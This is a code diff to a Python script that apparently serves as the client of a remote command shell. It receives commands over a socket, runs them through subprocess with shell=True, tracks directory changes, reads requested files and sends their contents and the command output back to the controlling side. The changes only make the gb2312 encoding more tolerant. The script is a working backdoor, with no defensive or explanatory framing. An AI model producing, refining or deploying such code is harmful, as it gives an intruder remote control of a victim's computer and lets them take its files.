@@ -10,9 +10,9 @@ nav = ""
 
 def get_loc(nav):
     if nav == "":
-        r = subprocess.check_output("dir", shell = True).decode("gb2312")
+        r = subprocess.check_output("dir", shell = True).decode("gb2312", "ignore")
     else:
-        r = subprocess.check_output(nav + " && " + "dir", shell = True).decode("gb2312")
+        r = subprocess.check_output(nav + " && " + "dir", shell = True).decode("gb2312", "ignore")
     end = r.find(" 的目录")
     start = r[:end].rfind("\n")
     return r[start + 2 : end]
@@ -40,13 +40,13 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
             except:
                 file_content = "download err"
             print("dld file content:", file_content)
-            s.send((file_content + "\ndone1997").encode("gb2312"))
+            s.send((file_content + "\ndone1997").encode("gb2312", "ignore"))
 
         elif to_do[:2] == "cd" or to_do[:2].lower() == "a:" or to_do[:2].lower() == "c:" or to_do[:2].lower() == "d:" or to_do[:2].lower() == "e:" or to_do[:2].lower() == "f:" or to_do[:2].lower() == "g:":
             if nav == "":
                 nav = to_do
                 loc = get_loc(nav)
-                s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312"))
+                s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312", "ignore"))
             else:
             	try:
             		if nav == "":
@@ -55,7 +55,7 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
             		    loc = get_loc(nav + " && " + to_do)
             		nav = nav + " && " + to_do
             		print("now your location is: " + loc)
-            		s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312"))
+            		s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312", "ignore"))
             	except:
             		print("cd err")
             		s.send(b"cd err done1997")
@@ -72,8 +72,8 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
                 output = b"run cmd err"
             if output == b"":
                 output = b"return value is empty string, so I return this"
-            print("output:", output.decode("gb2312"))
-            s.send((output + b"\ndone1997").decode("gb2312").encode("gb2312"))
+            print("output:", output.decode("gb2312", "ignore"))
+            s.send((output + b"\ndone1997").decode("gb2312", "ignore").encode("gb2312", "ignore"))
             
 
 s.close()
